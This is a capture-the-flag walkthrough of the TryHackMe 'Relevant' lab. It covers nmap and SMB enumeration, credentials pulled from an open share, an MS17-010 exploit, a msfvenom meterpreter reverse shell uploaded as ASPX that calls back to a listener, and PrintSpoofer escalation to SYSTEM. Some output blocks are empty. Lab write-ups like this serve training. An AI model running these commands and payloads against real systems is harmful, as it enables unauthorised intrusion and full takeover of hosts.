# Relevant

| [![Overpass](../../_static/images/relevant.png)](https://tryhackme.com/room/relevant) |
|:--:|
| [https://tryhackme.com/room/relevant](https://tryhackme.com/room/relevant) |

## Scanning

Run a simple port scan (without Ping)

	nmap -Pn -p- 10.10.148.168 -oN portscan

portscan:

```text

```

Run an `-A` scan on the open ports:

	nmap -Pn -T4 -A -p80,135,139,445,3389 10.10.148.168 -oN servicescan

servicescan:

```text

```

## HTTP enumeration

    # nikto -h http://10.10.148.168

## Hidden files and directories

    # gobuster dir -u http://10.10.148.168 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50

## SMB enumeration

    $ smbclient -L //10.10.148.168

Nmap scan on ports 139 and 445 with all SMB enumeration scripts: 

    nmap -p 139,445 -Pn –script smb-enum* 10.10.148.168

    nmap -p 139,445 -Pn –script smb-vuln* 10.10.148.168

    smbclient //10.10.148.168/nt4wrksv

    smb: \> ls

    smb: \> get passwords.txt

    
    # cat passwords.txt

Decode:

    $ echo " " | base64 -d

## Exploiting SMB MS17-010

Clone or download the [AutoBlue-MS17-010 script](https://github.com/3ndG4me/AutoBlue-MS17-010), set up 
a virtual environment and install the requirements.

Use `zzz_exploit.py` with target IP address, SMB port and credentials to authenticate if needed:

    python zzz_exploit.py -target-ip 10.10.148.168 -port 445 'Bob:<password>'

## Exploiting HTTP on port 49663

    # msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.9.1.53 lport=4444 -f aspx -o shell.aspx

Connect to the network share and upload the reverse shell `.aspx` file: 

    # smbclient //10.10.148.168/nt4wrksv
    smb: \> put shell.aspx

Set up a listener:

    # nc -nlvp 4444

Or set up mult-handler in Metasploit:

    # msfconsole -q
    msf6 > use exploit/multi/handler
    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
    msf6 exploit(multi/handler) > set lhost 10.9.1.53
    msf6 exploit(multi/handler) > set lport 4444
    msf6 exploit(multi/handler) > run

Access the `shell.aspx` file with `curl` or in browser:

    # curl http://10.10.148.168:49663/nt4wrksv/shell.aspx

    meterpreter > getuid

User flag:

    meterpreter > cat c:/users/bob/desktop/user.txt

## Privilege escalation

    meterpreter > getprivs

[Juicy Potato](https://github.com/ohpe/juicy-potato) does not work for Windows Server 2019 and Windows 10 versions 
1809 and higher, but using [PrintSpoofer](https://github.com/dievus/printspoofer) might work for 
abusing Impersonation Privileges .

Download PrintSpoofer from the Git repository to put it on the `nt4wrksv` SMB share to be transferred to the target 
machine:

    # wget https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe

    # smbclient // /nt4wrksv     
    smb: \> put PrintSpoofer.exe       
                                   
Run:

    c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer.exe -i -c powershell.exe

    PS C:\Windows\system32> whoami
    whoami
    nt authority\system

Root flag:

    PS C:\users\administrator\desktop> cat root.txt